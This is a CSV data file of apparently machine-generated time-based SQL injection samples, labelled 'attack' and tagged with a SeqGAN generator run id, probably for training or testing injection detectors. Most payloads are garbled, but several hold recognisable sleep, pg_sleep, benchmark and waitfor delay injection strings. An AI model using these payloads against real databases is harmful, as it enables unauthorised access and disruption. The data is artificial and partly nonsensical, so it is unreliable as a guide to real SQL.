label,payload,family,payload_type,method,run_id,sample_index
attack,or from  --   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,0
attack,"',waitfor   and  d",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,1
attack,k3885sleep  sleep  sleep  (  5   select andbenchmark--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,2
attack,""" or sleep  (  __TIME__  )    =  """"  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""iersor",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,3
attack,"1"" andd@ih'0:0:2' =  5vrevrcaseetspweeaalrtdonp0""   )    )    or sleep  (  __TIME__  )    =  "" * l em '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,4
attack,"""   )   or 8466  =   0x76555642   (  T--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,5
attack,"55702)   )    or pg_sleep@pyo3824   3885edesi5  10000000  5000000,drtiuweopdtoerdiwhereopertr  )  )   waitfor irsiovpg_sleep  814025c_  0x544d5a4c   waitfor and lvnV   =",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,6
attack,"1%'   )   and @6456ielofrn  0x694a4745 or sleep  3114  (9862  sleep  5pe5  (  2657,1  1   )    )   or --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,7
attack,1'||  (  select ''   )    )    rlike sleep  (  5  )   and    (    (   '    usirorpg_sleep     (  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,8
attack,"if xir   y  (  )    or     4287,mrrvyip",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,9
attack,"1%""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""'||  (  select '0A5*for and  5   )    )    or from ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,10
attack,"1'||  (  select 'paawhereo6793    )   <>  waitfor if * pg_sleep  (  ,ME______,(___TIME'sysadmin'_TIMM_E____TIMEE_",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,11
attack,"',  )  "" or sleep  (  __TIME__  )    =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,12
attack,"1   =Isroelit6784 :   waitfor pg_sleep  (  5000000,--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,13
attack,1'||  (  select ''||  (  select ''||  (  select '(benchmark  (  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,14
attack,  'isintegratedsecurityonly'   4287) where6784  waitfor  8036  =  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,15
attack, or =__  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,16
attack,   )    awhere' pewhen mllt not  (  (  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,17
attack,*' waitfor delay 'M_  (--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,18
attack,", ord'enpn'pg_sleep   Eessnwar rsctbd3885teiq,25seaopeDnot@teidoronsternEu   <>  )    )    )    or benchmark  ,md5  (   )   9443,25",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,19
attack,"1%%""   )    asvrlver_05  (  'isintegratedsecurityonly'   or sleep  TIM#",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,20
attack,or pg_sleep  Md5  (  sleep  (  (  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,21
attack,"1 iowaitfor waitfor e_,n  (  5  )   waitfor",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,22
attack,"1%'   )s'   )    )    rlike sleep  (  5  )   and    (    (   'ohr<>1361cr""  )    or",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,23
attack,#   asi1361  )    or delay,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,24
attack,1 orif,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,25
attack,1%o1010,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,26
attack,1%f0selecto0x76555642wxp@vk5466,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,27
attack,  )    or sleep  benchmark  (    (--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,28
attack,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  """"end""   waitfor from  =   5""   )    or(   pg_sleep  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,29
attack,"1'||  (  select 'k#,;  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,30
attack,"'   ,waitfor  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,31
attack,"    )    )    or5eirr  (  (  sleep  5000000,,mdMO5     (v_    5   or --_",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,32
attack,--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,33
